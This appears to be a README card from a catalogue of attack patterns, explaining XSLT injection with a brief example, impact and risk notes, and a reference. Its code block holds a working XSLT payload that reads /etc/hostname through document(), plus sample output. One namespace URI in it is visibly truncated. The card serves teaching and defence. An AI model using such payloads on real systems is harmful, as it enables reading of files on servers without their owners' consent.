<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/xslt-injection/main/xslt-injection.png"></p>

A threat actor may interfere with an application's processing of extensible stylesheet language transformations (XSLT) for markup language (XML) to read or modify data on the target

## Example #1
1. Threat actor submits a malicious request to a target that has a vulnerable XSLT processor
2. The target's XSLT processor parses the malicious file (Based on the processor and the version of the XSLT specification)

## Code
#### Target-in
```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xs>
  <xsl:template match="/">
    <xsl:copy-of select=" document('/etc/hostname')"/>
  </xsl:template>
</xsl:stylesheet>
```

#### Target-Out
```
...
...
usystem01
```

## Impact
High

## Names
- XSLT Injection

## Risk
- Read & Write data
- Command Execution

## Redemption
- Secure processing

## ID
012e4a7b-b8ae-44a6-9b6f-08d24cf7dba2

## References
- [acunetix](https://www.acunetix.com/vulnerabilities/web/xslt-injection)
